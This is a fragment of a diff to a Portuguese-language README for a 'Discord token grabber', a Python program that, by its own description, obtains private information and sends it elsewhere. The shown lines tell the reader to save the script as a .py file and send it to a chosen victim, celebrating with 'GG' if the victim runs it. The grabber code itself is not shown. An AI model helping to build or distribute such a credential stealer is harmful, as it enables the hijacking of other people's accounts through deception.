@@ -1,4 +1,4 @@
-- TOKEN DISCORD GRABBER
+ TOKEN DISCORD GRABBER
 
 
 OBS: Salve o texto em  .PY , o nome antes você decide.
@@ -16,3 +16,8 @@ OBS: Programa python simples que pode obter informações privadas e enviar para
 
 
 3 => Pronto ! grabber feito, agora só mandar pro usuário desejado e caso ele cair  GG !
+
+
+
+
+
